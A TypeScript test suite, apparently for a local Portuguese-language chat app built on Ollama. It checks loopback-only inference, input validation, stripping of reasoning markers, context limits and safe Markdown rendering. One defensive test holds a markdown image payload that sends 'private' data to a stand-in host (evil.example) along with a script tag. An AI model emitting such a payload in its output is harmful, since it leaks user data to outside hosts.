import assert from "node:assert/strict";
import { afterEach,mock,test } from "node:test";
import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { inferOnComputer,validateInference } from "../lib/local-inference";
import { modelMessages } from "../lib/local-model";
import { searchMany } from "../lib/web-search";
import SafeMarkdown from "../components/safe-markdown";
afterEach(()=>mock.restoreAll());
test("inferência usa somente Ollama em loopback, sem ferramentas, nuvem ou execução de código",async()=>{
  const payload={messages:[{role:"user" as const,content:"Converse em português"}]};
  mock.method(globalThis,"fetch",async(url:unknown,init:RequestInit)=>{
    assert.equal(url,"http://127.0.0.1:11434/api/chat");const body=JSON.parse(String(init.body));assert.equal(body.model,"qwen3:4b-instruct");assert.equal(body.think,false);assert.equal(body.tools,undefined);assert.equal(body.options.num_predict,384);
    const raw=new TextEncoder().encode(JSON.stringify({done:true,message:{role:"assistant",content:"Olá, vamos conversar!"}})),index=raw.indexOf(195)+1;
    return new Response(new ReadableStream({start(controller){controller.enqueue(raw.slice(0,index));controller.enqueue(raw.slice(index));controller.close();}}));
  });
  assert.equal(await inferOnComputer(payload,new AbortController().signal),"Olá, vamos conversar!");
});
test("mensagens, ferramentas adicionais, respostas incompletas e excessivas são recusadas",async()=>{
  for(const payload of [null,{messages:[]},{messages:[{role:"tool",content:"execute"}]},{messages:[{role:"user",content:"oi",images:["local-file"]}]},{messages:[{role:"user",content:"x".repeat(8501)}]},{messages:[{role:"user",content:"Oi"}],tools:[]}])assert.equal(validateInference(payload),false);
  for(const result of [{done:false,message:{role:"assistant",content:"Parcial"}},{done:true,message:{role:"assistant",content:""}},{done:true,message:{role:"assistant",content:"x".repeat(12001)}}]){
    const transport=mock.method(globalThis,"fetch",async()=>Response.json(result));await assert.rejects(()=>inferOnComputer({messages:[{role:"user",content:"Oi"}]},new AbortController().signal));transport.mock.restore();
  }
});
test("marcadores internos de raciocínio não são exibidos ou salvos",async()=>{
  mock.method(globalThis,"fetch",async()=>Response.json({done:true,message:{role:"assistant",content:"<think>rascunho interno</think>Resposta pública."}}));
  assert.equal(await inferOnComputer({messages:[{role:"user",content:"Oi"}]},new AbortController().signal),"Resposta pública.");
});
test("contexto tem tamanho limitado e nunca inclui memória pendente",()=>{
  const history=Array.from({length:100},()=>({role:"user" as const,content:"Conversa anterior ".repeat(200)}));
  const messages=modelMessages("Mensagem atual",history,[{id:"a",kind:"fact",label:"A",value:"PENDENTE",question:null,status:"pending"},{id:"b",kind:"fact",label:"B",value:"APROVADO",question:null,status:"approved"}],[]);
  assert(messages.length<=14);assert(messages.reduce((sum,message)=>sum+message.content.length,0)<=8500);assert.equal(messages.at(-1)?.content,"Mensagem atual");assert.doesNotMatch(JSON.stringify(messages),/PENDENTE/);assert.match(JSON.stringify(messages),/APROVADO/);
});
test("pesquisa múltipla mantém endpoints fixos, deduplica fontes e limita consultas",async()=>{
  const network=mock.method(globalThis,"fetch",async(url:URL)=>{
    assert.equal(url.hostname,"www.bing.com");const term=url.searchParams.get("q");return new Response(`<rss><channel><item><title>${term}</title><link>https://example.com/${term}</link><description>Informações ${term}</description></item></channel></rss>`);
  });
  const result=await searchMany("alpha; beta",new AbortController().signal);assert.equal(result.results.length,2);assert.equal(result.queries?.length,2);assert.equal(network.mock.calls.length,2);
  await assert.rejects(()=>searchMany("a;b;c;d",new AbortController().signal));assert.equal(network.mock.calls.length,2);
});
test("Markdown do modelo não carrega imagens, HTML ou links externos automaticamente",()=>{
  const html=renderToStaticMarkup(<SafeMarkdown>{'![privado](https://evil.example/collect?data=private)\n\n<script>executar()</script>\n\n[fonte](https://example.com)'}</SafeMarkdown>);
  assert.doesNotMatch(html,/<img|<script|collect\?data|href="https:/);assert.match(html,/<button/);
});
